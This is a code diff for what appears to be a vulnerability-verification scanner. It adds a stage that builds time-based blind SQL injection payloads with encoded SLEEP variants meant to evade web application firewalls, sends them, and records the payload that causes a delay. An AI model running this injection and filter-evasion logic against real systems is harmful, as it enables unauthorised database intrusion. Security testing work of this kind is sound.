@@ -4305,6 +4305,54 @@ def verify_generic_sqli_blind(
                          f"status_bt={status_bt}, has_sql_error={has_sql_error} -- "
                          f"no se confirmo inyeccion de identifier.")
 
+        # WAF BYPASS: variantes de encoding del token SLEEP(N) para eludir filtros que bloquean
+        # la palabra clave exacta (case/inline-comments/URL-encoding). Solo se prueban los
+        # dialectos MySQL/Postgres que ya se saben soportados en el lab (omitimos WAITFOR y
+        # randomblob que ya tienen su propio bloque). Prioridad baja: se intenta SOLO si los
+        # payloads estandar ya fallaron y budget lo permite.
+        if not found:
+            try:
+                from .payload_kb import load_sqli_waf_bypass_variants as _sqli_waf_bypass
+                _waf_bypass_tried = False
+                for _base_sleep_expr in _SQLI_SLEEP_EXPRS:
+                    if found:
+                        break
+                    for _bypass_expr in _sqli_waf_bypass(_base_sleep_expr):
+                        if found:
+                            break
+                        for ctx in _SQLI_CONTEXTS:
+                            if found:
+                                break
+                            for op in _SQLI_BOOLEAN_OPS:
+                                if found:
+                                    break
+                                _waf_clause = _sqli_sleep_clause(op, _bypass_expr)
+                                for cm in _SQLI_COMMENTS:
+                                    _waf_pl = f"{orig_value}{ctx} {op} {_waf_clause}{cm}"
+                                    _waf_bypass_tried = True
+                                    step(f"WAF bypass: {sqli_param}={_waf_pl!r}...")
+                                    _t1 = timed_send(_waf_pl)
+                                    _t2 = timed_send(_waf_pl)
+                                    _entry = {"payload": _waf_pl, "tiempo_1_s": round(_t1, 2) if _t1 else None,
+                                              "tiempo_2_s": round(_t2, 2) if _t2 else None,
+                                              "estrategia": "waf-bypass-sleep"}
+                                    tried.append(_entry)
+                                    if (_t1 is not None and _t2 is not None
+                                            and _t1 >= threshold and _t2 >= threshold):
+                                        found = True
+                                        res.evidence["payload_ganador"] = _waf_pl
+                                        res.evidence["tiempo_1_ganador_s"] = round(_t1, 2)
+                                        res.evidence["tiempo_2_ganador_s"] = round(_t2, 2)
+                                        res.evidence["estrategia"] = "waf-bypass-sleep"
+                                        step(f"VERIFICADO (WAF bypass SLEEP): {sqli_param}={_waf_pl!r} "
+                                             f"retraso la respuesta ~{round((_t1+_t2)/2, 1)}s CONSISTENTE "
+                                             f"-- filtro WAF evadido con variante de encoding.")
+                                        break
+                if not found and _waf_bypass_tried:
+                    step("WAF bypass SLEEP: ninguna variante produjo retraso consistente.")
+            except ImportError:
+                pass
+
         # IN-BAND BOOLEAN SQLi fallback: cuando el motor no soporta SLEEP/pg_sleep/randomblob
         # (p.ej. SQLite) pero la respuesta REFLEJA los datos de la consulta (como str(fetchall())),
         # podemos comparar la respuesta "true" (OR 1=1) con la baseline "false" (OR 1=2).
